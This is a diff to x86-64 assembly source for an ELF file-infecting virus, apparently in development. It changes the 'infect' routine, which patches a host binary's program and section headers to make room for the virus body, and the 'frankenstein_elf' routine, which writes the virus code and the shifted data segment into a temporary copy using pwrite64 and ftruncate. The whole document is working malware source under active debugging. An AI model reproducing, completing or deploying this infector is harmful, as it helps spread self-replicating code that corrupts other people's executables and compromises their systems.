@@ -299,6 +299,7 @@ oshoff: dd 0
 
 hostentry_offset: dd 0
 hosttext_start: dd 0
+host_shdrs_len: dd 0
 
 data_offset_new_padding: dd 0
 data_offset_original: dd 0
@@ -781,10 +782,12 @@ infect:
 					add qword [r13 + r12 + elf_phdr.p_memsz], vlen
 					jmp .next_phdr				;this jmp might be unneccessary but adding it for testing	
 				.mod_phdr_data_segment:			
-					mov r11d, dword [r13 + r12 + elf_phdr.p_offset]
+					mov r11, [r13 + r12 + elf_phdr.p_offset]
 					mov dword [data_offset_original],  r11d
-					lea r10, [r13 + r12 + elf_phdr.p_offset]
-					mov [DATA_OFFSET_HOST], r10
+					;lea r10, [r13 + r12 + elf_phdr.p_offset]
+					lea qword r10, [r13 + r12 + elf_phdr.p_offset]
+					mov qword [DATA_OFFSET_HOST], r10
+					;mov [r14 + 0x900], r10			;name of file in rdi
 					add dword r11d, [PAGESIZE]
 					mov dword [r13 + r12 + elf_phdr.p_offset], r11d
 					mov dword [data_offset_new_padding],  r11d
@@ -831,7 +834,7 @@ infect:
 			cmp dword r11d, [vxoffset]
 			jne .mod_subsequent_shdr
 			mov dword r10d, [r13 + r15 + elf_shdr.sh_size]
-			add dword r10d, vlen
+			add dword r10d, [vlen]
 			mov dword [r13 + r15 + elf_shdr.sh_size], r10d
 
 			.mod_subsequent_shdr:
@@ -840,9 +843,10 @@ infect:
 				mov dword [r13 + r15 + elf_shdr.sh_offset], r11d
 		.next_shdr:
 			dec cx 
-			add r12w, word [r13 + elf_ehdr.e_shentsize] ;add elf_ehdr.e_phentsize to phdr offset in r12 
+			add r15w, word [r13 + elf_ehdr.e_shentsize] ;add elf_ehdr.e_shentsize to shdr offset in r15 
 			cmp cx, 0
 			jg .shdr_loop
+	mov dword [host_shdrs_len], r15d
 	lea r10, [r13 + elf_ehdr.e_shoff]
 	mov [SHDR_OFFSET_HOST], r10
 	mov r11, [r13 + elf_ehdr.e_shoff]
@@ -940,15 +944,15 @@ frankenstein_elf:
 		lea rsi, [r13 + elf_ehdr]					;r13 contains pointer to mmap'd file
 		mov rax, SYS_WRITE
 		syscall
-
+;		jmp .write_datasegment_totemp
 	.write_virus_totemp:
 		mov rdi, r9
 		mov rdx, vlen
 		mov rsi, _start
-		mov r10d, [vxoffset]
+		mov r10d, dword [vxoffset]
 		mov rax, SYS_PWRITE64
 		syscall
-		mov rsi, rax
+		;mov rsi, rax
 	
 	;ftruncate syscall will grow the size of file (corresponding to file descriptor fd)
 	; by n bytes, where n is a signed integer, passed in rsi
@@ -958,21 +962,37 @@ frankenstein_elf:
 		mov esi, dword [data_offset_new_padding]
 		mov rax, SYS_FTRUNCATE
 		syscall
+;		jmp .close_temp		
+	;.lseek_host_datasegment:
+	;	lea rsi, [r13 + elf_ehdr]					;r13 contains pointer to mmap'd file
+		
+
 	.write_datasegment_totemp:
-		mov rdx, [oshoff]
-		sub edx, dword [data_offset_original]
-		mov rsi, [DATA_OFFSET_HOST]
+		mov rdx, [r14 + filestat.st_size]
+		;sub edx, dword [oshoff]
+		;mov rdx, [oshoff]
+		;sub edx, dword [data_offset_original]
+		sub edx, dword [vxoffset]
+		;add edx, dword [host_shdrs_len]
+		;mov rsi, [DATA_OFFSET_HOST]
+		lea rsi, [r13 + elf_ehdr]
+		;mov rdi, r9
+		; 0x900]						;r13 contains pointer to mmap'd file
+		;add rsi, qword [DATA_OFFSET_HOST]
+		add rsi, qword [data_offset_original]
+		;mov esi, dword [data_offset_new_padding]
 		mov r10d, dword [data_offset_new_padding]
 		mov rax, SYS_PWRITE64
 		syscall
+		jmp .close_temp		
 
 	.write_patched_shdrs_totemp:
-		mov rdx, [r14 + filestat.st_size]
-		sub edx, dword [oshoff]
-		mov rsi, [SHDR_OFFSET_HOST]
-		mov r10d, dword [vxshoff]
-		mov rax, SYS_PWRITE64
-		syscall
+		;mov rdx, [r14 + filestat.st_size]
+		;sub edx, dword [oshoff]
+		;mov rsi, [SHDR_OFFSET_HOST]
+		;mov r10d, dword [vxshoff]
+		;mov rax, SYS_PWRITE64
+		;syscall
 ;		jmp .close_temp		
 
 		
